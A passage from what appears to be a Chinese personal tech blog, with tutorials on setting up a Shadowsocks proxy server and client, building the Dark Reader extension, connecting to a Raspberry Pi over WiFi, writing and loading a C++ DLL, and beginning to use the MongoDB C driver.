<p>Shadowsocks官网： <a href="https://shadowsocks.org/en/index.html">https://shadowsocks.org/en/index.html</a><br />
Shadowsocks配置介绍： <a href="https://shadowsocks.org/en/config/quick-guide.html">https://shadowsocks.org/en/config/quick-guide.html</a><br />
Github：<a href="https://github.com/shadowsocks/">https://github.com/shadowsocks/</a></p>
<h2 id="ss配置服务器"><a class="markdownIt-Anchor" href="#ss配置服务器"></a> SS配置服务器</h2>
<p>查看python版本</p>
<figure class="highlight autoit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@hwsrv</span><span class="hljs-number">-548851</span> ~]<span class="hljs-meta"># python --version</span><br>Python <span class="hljs-number">2.7</span><span class="hljs-number">.5</span><br></code></pre></div></td></tr></table></figure>
<p>我的centos服务器默认没有安装Python Pip，同时可能还需要更新pip</p>
<figure class="highlight autoit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@hwsrv</span><span class="hljs-number">-548851</span> ~]<span class="hljs-meta"># yum install python-pip</span><br>[root<span class="hljs-symbol">@hwsrv</span><span class="hljs-number">-548851</span> ~]<span class="hljs-meta"># pip install --upgrade pip</span><br></code></pre></div></td></tr></table></figure>
<p>之后就可以通过pip安装shadowsocks</p>
<figure class="highlight autoit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@hwsrv</span><span class="hljs-number">-548851</span> ~]<span class="hljs-meta"># pip install shadowsocks</span><br></code></pre></div></td></tr></table></figure>
<p>到此SS服务端安装完成，接下来还需要json格式的配置文件</p>
<figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm">&#123;<br>    <span class="hljs-string">&quot;server&quot;</span>:<span class="hljs-string">&quot;my_server_ip&quot;</span>,<br>    <span class="hljs-string">&quot;server_port&quot;</span>:<span class="hljs-number">8388</span>,<br>    <span class="hljs-string">&quot;local_address&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>    <span class="hljs-string">&quot;local_port&quot;</span>:<span class="hljs-number">1080</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;barfoo!&quot;</span>,<br>    <span class="hljs-string">&quot;timeout&quot;</span>:<span class="hljs-number">600</span>,<br>    <span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-string">&quot;chacha20-ietf-poly1305&quot;</span><br>&#125;<br><span class="hljs-symbol">server:</span> 服务器主机IP，默认 <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br><span class="hljs-symbol">server_port:</span> 服务器端口 ，默认 <span class="hljs-number">8388</span><br><span class="hljs-symbol">local_address:</span> 一般为 <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br><span class="hljs-symbol">local_port:</span> 本地端口，一般 <span class="hljs-number">1080</span><br><span class="hljs-symbol">password:</span> 连接SS服务器的密码<br><span class="hljs-symbol">timeout:</span> 连接超时时间/s ，默认 <span class="hljs-number">300</span><br><span class="hljs-symbol">method:</span> 加密方式，默认 aes<span class="hljs-number">-256</span>-cfb<br></code></pre></div></td></tr></table></figure>
<p>如果要从命令行来启动服务端，则可以</p>
<figure class="highlight autoit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@hwsrv</span><span class="hljs-number">-548851</span> ~]<span class="hljs-meta"># ssserver -p 8998 -k mypassword</span><br></code></pre></div></td></tr></table></figure>
<p>一般都是从配置文件来启动ss服务端<br />
类似如下 config.json</p>
<figure class="highlight json"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;server&quot;</span>: <span class="hljs-string">&quot;104.168.xxx,xxx&quot;</span>,<br>    <span class="hljs-attr">&quot;server_port&quot;</span>: <span class="hljs-number">8998</span>,<br>    <span class="hljs-attr">&quot;local_address&quot;</span>: <span class="hljs-string">&quot;127.0.0.1&quot;</span>,<br>    <span class="hljs-attr">&quot;local_port&quot;</span>: <span class="hljs-string">&quot;1080&quot;</span>,<br>    <span class="hljs-attr">&quot;password&quot;</span>: <span class="hljs-string">&quot;mypassword&quot;</span>,<br>    <span class="hljs-attr">&quot;timeout&quot;</span>: <span class="hljs-number">60</span>,<br>    <span class="hljs-attr">&quot;method&quot;</span>: <span class="hljs-string">&quot;aes-256-cfb&quot;</span><br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>使用配置文件启动服务端并在后台运行： <code>ssserver -c config.json -d start</code> ，检测是否成功启动</p>
<figure class="highlight tap"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs tap">[root@hwsrv-548851 ~]<span class="hljs-comment"># netstat -anp|grep -i 8998</span><br>tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>104.168.xxx,xxx:8998    0.0.0.0:*               LISTEN      27701/python2       <br>udp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>104.168.xxx,xxx:8998    0.0.0.0:*                           27701/python2       <br></code></pre></div></td></tr></table></figure>
<h2 id="ss配置客户端"><a class="markdownIt-Anchor" href="#ss配置客户端"></a> SS配置客户端</h2>
<p>SS的客户端分为Windows，MacOS，Linux，Android，iOS和OpenWRT<br />
这里介绍Windows，Linux</p>
<h3 id="linux"><a class="markdownIt-Anchor" href="#linux"></a> Linux</h3>
<p>对于archlinux最直接的方法： <code>sudo pacman -S shadowsocks-qt5</code> 从GUI连接ss服务器<br />
也可以从pip下载shadowsocks： <code>pip install shadowsocks</code>，然后再创建一个同服务端的config.json配置文件如 <code>sslocal -c config.json -d start</code></p>
<h3 id="windows"><a class="markdownIt-Anchor" href="#windows"></a> WIndows</h3>
<p>Windows下的 ss客户端 也可以从Python pip安装 <code>shadowsocks</code> 。也可以从 <a href="https://github.com/shadowsocks/shadowsocks-windows/releases">https://github.com/shadowsocks/shadowsocks-windows/releases</a> 下载</p>
<p>不过如果从pip下载 shadowsocks，那么是无法直接启动的，解决方法如下：<br />
到 <a href="https://slproweb.com/products/Win32OpenSSL.html">https://slproweb.com/products/Win32OpenSSL.html</a> 下载最新版Windows openssl安装，然后去openssl安装目录 C:\Program Files\OpenSSL-Win64 找到 <code>libcrypto-1_1-x64.dll</code> 复制到 Python <code>Scripts</code>目录并重命名为<code>libcrypto.dll</code> 。否则提示 <code>libcrypto(OpenSSL) not found</code> 错误。</p>
<p>完成以上时运行 <code>sslocal -c config.json</code> 会提示错误 <code>AttributeError: function 'EVP_CIPHER_CTX_cleanup' not found</code></p>
<p>原因是 openssl1.1.0版本中，废弃了<code>EVP_CIPHER_CTX_cleanup</code> 函数，可以用 <code>EVP_CIPHER_CTX_reset</code> 函数替代<code>EVP_CIPHER_CTX_cleanup</code> 函数。</p>
<p>那么我们只需打开 C:\Users\Administrator\AppData\Local\Programs\Python\Python37\Lib\site-packages\shadowsocks\crypto\<a href="http://openssl.py">openssl.py</a> 文件(路径可能不同)，将 <code>EVP_CIPHER_CTX_cleanup</code> 全部替换为 <code>EVP_CIPHER_CTX_reset</code>，总共两处需要修改，之后保存即可。</p>
<p>执行 <code>sslocal -c config.json</code> 成功！</p>
<h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h2>
<ul>
<li><a href="https://shadowsocks.org/en/download/servers.html">Shadowsocks Server</a></li>
<li><a href="https://shadowsocks.org/en/download/clients.html">Shadowsocks Client</a></li>
</ul>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>CentOS</tag>
        <tag>Shadowsocks</tag>
      </tags>
  </entry>
  <entry>
    <title>Chrome浏览器网页变成黑色(Dark Reader)</title>
    <url>/chrome-dark/</url>
    <content><![CDATA[<p>Dark Reader 就是一个开源chrome浏览器的扩展程序，它可以让大部分网页在夜间和日间浏览。对于使用Chrome的用户来说，这是一个很好的护眼插件。目前Dark Reader支持的浏览器有Chrome，Firefox，Safari</p>
<span id="more"></span>
<h3 id="duckduckgo和dark-reader"><a class="markdownIt-Anchor" href="#duckduckgo和dark-reader"></a> DuckduckGo和Dark Reader</h3>
<p>总所周知，DuckduckGo是一个保护用户隐私的搜索引擎，但它有一个好处是能够设置页面的主题</p>
<p><img src="/uploads/images/darkreader/file_001.png" alt="img" /></p>
<p>通过Dark Reader插件后的chrome浏览器</p>
<p><img src="/uploads/images/darkreader/file_002.png" alt="img" /></p>
<h3 id="获取dark-reader"><a class="markdownIt-Anchor" href="#获取dark-reader"></a> 获取Dark Reader</h3>
<blockquote>
<p><a href="https://chrome.google.com/webstore/detail/dark-reader/eimadpbcbfnmbkopoojfekhnkhdbieeh?utm_source=chrome-app-launcher-info-dialog">1. chrome网上应用店</a></p>
<p><a href="https://github.com/darkreader/darkreader">2. Github</a></p>
</blockquote>
<h3 id="安装方式"><a class="markdownIt-Anchor" href="#安装方式"></a> 安装方式</h3>
<p>对于第一种安装方式，这里不在多说，很简单。这里介绍下第二种安装方法。</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/darkreader/</span>darkreader.git<br>cd darkreader<br>npm install<br>npm run release<br></code></pre></div></td></tr></table></figure>
<p>这是就会在当前目录下生成 <strong>build.zip</strong>，<strong>build-firefox.xpi</strong>，<strong>build文件夹</strong>。</p>
<p>其中 build-firefox.xpi 用于Firefox，而build则用于chrome，可能有人会问，chrome的插件后缀不是 <strong>.crx</strong> 吗？</p>
<p>不急，我们打开chrome-&gt;扩展程序，开启【开发者模式】后，【加载已解压的扩展程序…】后找到那个 build文件夹 后发现插件加载成功！</p>
<p><img src="/uploads/images/darkreader/file_005.png" alt="img" /></p>
<h3 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h3>
<p>功能如下</p>
<ul>
<li>通过网站列表过滤设置黑暗/明亮主题</li>
<li>亮度，对比度，棕褐色滤镜，灰度</li>
<li>字体，文字描边</li>
</ul>
<p><img src="/uploads/images/darkreader/file_004.png" alt="img" /></p>
<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
<p>总之，Dark Reader是一个非常有实用价值的开源chrome插件。但是Android Chrome没有安装插件这一功能，不过可以通过 <strong>chrome://flags</strong> 来设置chrome主题！</p>
<p>bye~</p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Chrome</tag>
        <tag>Google</tag>
      </tags>
  </entry>
  <entry>
    <title>电脑无线连接到树莓派(RaspPi)</title>
    <url>/connect-reappi/</url>
    <content><![CDATA[<p>当得到一块树莓派时，已经刷入raspbian系统，除了用网线连接树莓派和电脑外，还可以通过无线WiFi连接到树莓派</p>
<span id="more"></span>
<h3 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h3>
<p>正常来讲，我得用另一个根网线把电脑和树莓派连在一起。在主机上连接无线WiFi，再 <strong>fping -asqg 192.168.1.0/24</strong> 或 <strong>nmap</strong> 找到局域网下树莓派的IP地址。而现在，我不要让主机连接WiFi(这样网络速度快很多)，即在树莓派启动时自动连接到WiFi热点。</p>
<p>因此，可以把已经刷好的SD卡里面的有关网络的系统配置文件 <strong>/etc/network/interfaces</strong> 进行修改。</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">auto</span> lo<br><span class="hljs-attribute">iface</span> lo inet loopback<br><span class="hljs-attribute">auto</span> eth<span class="hljs-number">0</span><br><span class="hljs-attribute">iface</span> eth<span class="hljs-number">0</span> inet static<br><span class="hljs-attribute">address</span> <span class="hljs-number">192.168.1.105</span><br><span class="hljs-attribute">netmask</span> <span class="hljs-number">255.255.255.0</span><br><span class="hljs-attribute">gateway</span> <span class="hljs-number">192.168.1.1</span><br><span class="hljs-comment">#auto wlan0</span><br><span class="hljs-attribute"><span class="hljs-nomarkup">allow</span></span>-hotplug wlan<span class="hljs-number">0</span><br><span class="hljs-attribute">iface</span> wlan<span class="hljs-number">0</span> inet static <br><span class="hljs-attribute">address</span> <span class="hljs-number">192.168.1.110</span><br><span class="hljs-attribute">netmask</span> <span class="hljs-number">255.255.255.0</span><br><span class="hljs-attribute">gateway</span> <span class="hljs-number">192.168.1.1</span><br><span class="hljs-attribute">wpa</span>-ssid WiFi名称<br><span class="hljs-attribute">wpa</span>-psk WiFi密码<br></code></pre></div></td></tr></table></figure>
<p>这里我将wlan0接口设置成静态地址，这样的话以后就可以很方便通过ssh连接到树莓派了。</p>
<p>现在再把SD卡插入树莓派，启动，稍等片刻 <strong>fping -asqg 192.168.1.0/24</strong> 扫描局域网主机后，就可以看到设置的静态IP地址192.168.1.11</p>
<p>或者指定一个 <strong>wpa_supplicant.conf</strong></p>
<p>/etc/network/interfaces</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-comment">#auto wlan0</span><br><span class="hljs-attribute"><span class="hljs-nomarkup">allow</span></span>-hotplug wlan<span class="hljs-number">0</span><br><span class="hljs-attribute">iface</span> wlan<span class="hljs-number">0</span> inet manual<br><span class="hljs-attribute">wpa</span>-roam /etc/wpa_supplicant/wpa_supplicant.conf<br><span class="hljs-attribute">iface</span> default inet dhcp<br></code></pre></div></td></tr></table></figure>
<p>/etc/wpa_supplicant/wpa_supplicant.conf</p>
<figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-attribute">ctrl_interface</span>=DIR=/var/run/wpa_supplicant <span class="hljs-attribute">GROUP</span>=netdev<br><span class="hljs-attribute">update_config</span>=1<br>network=&#123;<br>	<span class="hljs-attribute">ssid</span>=<span class="hljs-string">&quot;wifi名称&quot;</span><br>	<span class="hljs-attribute">psk</span>=<span class="hljs-string">&quot;wifi密码&quot;</span><br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>最后通过 <code>ssh pi@192.168.1.110</code> 即可连接到树莓派</p>
<p>bye~</p>
]]></content>
      <categories>
        <category>RaspberryPi</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>C++编写动态链接库Dll+调用Dll</title>
    <url>/cpp-call-dll/</url>
    <content><![CDATA[<h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3>
<blockquote>
<p>动态链接提供了一种方法，使进程可以调用不属于其可执行代码的函数。函数的可执行代码位于一个 DLL 文件中，该 DLL 包含一个或多个已被编译、链接并与使用它们的进程分开存储的函数。DLL 还有助于共享数据和资源。多个应用程序可同时访问内存中单个 DLL 副本的内容。<br />
使用动态链接库可以更为容易地将更新应用于各个模块，而不会影响该程序的其他部分。例如，您有一个大型网络游戏，如果把整个数百MB甚至数GB的游戏的代码都放在一个应用程序里，日后的修改工作将会十分费时，而如果把不同功能的代码分别放在数个动态链接库中，您无需重新生成或安装整个程序就可以应用更新</p>
</blockquote>
<span id="more"></span>
<h3 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h3>
<p>本文就Windows下创建一个dll动态库并调用</p>
<ul>
<li>打开VS2013，新建一个C++工程（不是MFC！），命名为 “mydll”，接着选中 “DLL”，”导出符号”，直接完成</li>
<li>这时，看到的是默认初始化好了的代码，我们把一些不必要的删掉（其实那些是用来参考的，实际编写时删掉也无大碍）。<br />
然后在“mydll.h”头文件里添加 下列代码：</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function">MYDLL_API  <span class="hljs-keyword">int</span>  _stdcall <span class="hljs-title">GetMaxNumber</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function">MYDLL_API <span class="hljs-keyword">void</span>  _stdcall <span class="hljs-title">ShowMsg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *, <span class="hljs-keyword">char</span>*)</span></span>;<br></code></pre></div></td></tr></table></figure>
<p>在“mydll.cpp”源文件添加 如下图所示的功能实现代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function">MYDLL_API  <span class="hljs-keyword">int</span>  _stdcall <span class="hljs-title">GetMaxNumber</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">return</span> a&gt;b?a*<span class="hljs-number">100</span>:b;<br>&#125;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function">MYDLL_API <span class="hljs-keyword">void</span>  _stdcall <span class="hljs-title">ShowMsg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * text, <span class="hljs-keyword">char</span>* title)</span></span><br><span class="hljs-function"></span>&#123;	<br>	<span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>,text,title,MB_OK);<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>OK!现在代码简简单单的写完了，那如何编译成 .dll 文件呢？<br />
单击菜单栏 &gt;”生成”&gt;”生成 mydll”，编译成功。（注意，不是 调试下的开始执行…）<br />
然后找到工程的目录所在路径，DeBug目录下找到 那个生成的 “mydll.dll”（现在是不是很激动呢 😃</p>
<h3 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h3>
<ul>
<li>在重新创建一个工程，这次是一个C++下的控制台应用程序来测试编写的dll是否成功运行！！<br />
工程名为“test_mydll”</li>
<li>添加一个.cpp源文件，添加如下代码：<br />
<strong>（注意，要把 mydll.dll 放到 生成的.exe 同一目录下）</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-comment">//全局...</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span><span class="hljs-params">(_stdcall *pGetMaxN)</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>)</span></span>;	<span class="hljs-comment">//定义一个函数指针类型</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(_stdcall *pShowMsg)</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *, <span class="hljs-keyword">char</span> *)</span></span>;<br><span class="hljs-built_in">main</span>()...<br><span class="hljs-comment">//动态加载 dll</span><br>HMODULE hModule = <span class="hljs-built_in">LoadLibrary</span>(<span class="hljs-string">L&quot;mydll.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (!hModule)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;Error!&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">//获取函数 GetMaxNumber 的地址</span><br>pGetMaxN pgetm = (pGetMaxN)<span class="hljs-built_in">GetProcAddress</span>(hModule, <span class="hljs-string">&quot;GetMaxNumber&quot;</span>);<br>cout &lt;&lt; <span class="hljs-built_in">pgetm</span>(<span class="hljs-number">10</span>, <span class="hljs-number">5</span>) &lt;&lt; endl;<br><span class="hljs-comment">//获取函数 ShowMsg 的地址</span><br>pShowMsg pshowm = (pShowMsg)<span class="hljs-built_in">GetProcAddress</span>(hModule, <span class="hljs-string">&quot;ShowMsg&quot;</span>);<br><span class="hljs-built_in">pshowm</span>(<span class="hljs-string">&quot;内容&quot;</span>, <span class="hljs-string">&quot;标题&quot;</span>);<br><span class="hljs-comment">//释放</span><br><span class="hljs-built_in">FreeLibrary</span>(hModule);<br><br></code></pre></div></td></tr></table></figure>
<p>这里要提醒一下哦，上面的是动态加载dll的，所以，就也是说，我们一直都没有使用原来的dll工程生成了那个“mydll.lib”的文件！<br />
那么现在以静态调用dll 也是可行的，但 要把那个.lib文件和 .h头文件放到 与.cpp 同一个目录下（注意，这个不是.dll文件，所以可以放在 与.cpp同一个目录下！！！！）</p>
<p><img src="/uploads/images/cpp/0.png" alt="img" /></p>
<p>然后，可以放心的吧以前动态调用的代码注释掉啦，添加新代码</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//	动态</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span><span class="hljs-params">( _stdcall *pGetMaxN)</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>)</span></span>; <span class="hljs-comment">//定义一个函数指针类型</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">( _stdcall *pShowMsg)</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *, <span class="hljs-keyword">char</span> *)</span></span>;<br><span class="hljs-comment">//	静态</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllimport) <span class="hljs-function"><span class="hljs-keyword">int</span> _stdcall <span class="hljs-title">GetMaxNumber</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllimport) <span class="hljs-function"><span class="hljs-keyword">void</span> _stdcall <span class="hljs-title">ShowMsg</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *, <span class="hljs-keyword">char</span>*)</span></span>;<br><br></code></pre></div></td></tr></table></figure>
<p>Bye~</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>C++ 调用MongoDB C Driver</title>
    <url>/cpp-call-mongodb-c-driver/</url>
    <content><![CDATA[<p>嗯……环境都准备好了，那么现在可以开始用我们敬爱的C++通过接口来间接操控MongoDB数据库。<br />
注意，要有一定的MongoDB数据库基础知识哦～</p>
<span id="more"></span>
<h3 id="启动mongodb服务器"><a class="markdownIt-Anchor" href="#启动mongodb服务器"></a> 启动MongoDB服务器</h3>
<p>首先要做的，就是启动服务器</p>
<blockquote>
<p>mongod --config ${MONGODB}/conf.d/mongo.conf</p>
</blockquote>
<p>要停止服务器，不建议直接<strong>kill</strong>掉，而是加上一个 <strong>–shutdown</strong> 参数</p>
<p>我们还要创建一个可读写指定数据库的用户，比如</p>
<blockquote>
<p>use admin<br />
db.createUser({user:’user_test’,pwd:’12345’,roles:[{role:’readWrite’,db:’db_test’}]}</p>
</blockquote>
<p>这里创建了用户 user_test，密码 12345，只能读写数据库 db_test</p>
<h3 id="mongoc"><a class="markdownIt-Anchor" href="#mongoc"></a> mongoc</h3>
<p>我们只需引用头文件 libmongoc-1.0/mongoc.h<br />
在 <strong>main</strong> 函数要调用 <strong>mongoc_init()</strong> 来初始化库以及结尾 <strong>mongoc_cleanup()</strong> 来释放</p>
<p>要连接到MongoDB数据库，就得提供一个连接字符串，类似于</p>
<p>mongodb://username:password@host:port/db<br />
例如： mongodb://localhost:27017表示连接到本地回环地址127.0.0.1，以及端口27017的服务器，这个连接方式无需验证身份(没有开启 <strong>auth</strong>)。<br />
然而，这个例子的连接字符串为： <strong>mongodb://user_test:12345@127.0.0.1:27017/db_test</strong></p>
<p>有了连接字符串，那么我们怎么连接到服务器？可以通过 mongoc_client_get_database() 来建立一个client</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">mongoc_client_t</span> * <span class="hljs-title">mongoc_client_new</span> <span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *uri_string)</span></span>;<br></code></pre></div></td></tr></table></figure>
<p>该函数返回一个 mongoc_client_t* 结构指针，之后的操作就是通过该指针来访问 database、collection……</p>
<blockquote>
<p>除了直接通过一个连接字符串来建立client，还可以‘构造’一个 <strong>uri</strong> 建立client。这一步也很简单，可以调用 <strong>mongoc_uri*</strong> 系列函数，再<br />
mongoc_client_new_from_uri()，如：<br />
mongoc_uri_t <em>uri=mongoc_uri_new(“mongodb://127.0.0.1:27017”);<br />
mongoc_uri_set_database(uri,”xxxx”);<br />
mongoc_uri_set_username(uri,”xxxx”);<br />
mongoc_uri_set_password(uri,”xxxx”);<br />
mongoc_client_t</em> client= mongoc_client_new_from_uri(uri);</p>
</blockquote>
<p>连接成功后，可以通过来获取 <strong>mongoc_client_get_default_database</strong> 来获取默认的数据库（前提是刚才连接字符串提供了一个数据库），或者 <strong>mongoc_client_get_database</strong> 来获取指定名称的数据库</p>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">mongoc_database_t</span> * <span class="hljs-title">mongoc_client_get_database</span> <span class="hljs-params">(<span class="hljs-keyword">mongoc_client_t</span> *client, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">mongoc_database_t</span> * <span class="hljs-title">mongoc_client_get_default_database</span> <span class="hljs-params">(<span class="hljs-keyword">mongoc_client_t</span> *client)</span></span>;<br></code></pre></div></td></tr></table></figure>
<p>通过 mongoc_database_has_collection() 判断是否存在一个 collection</p>
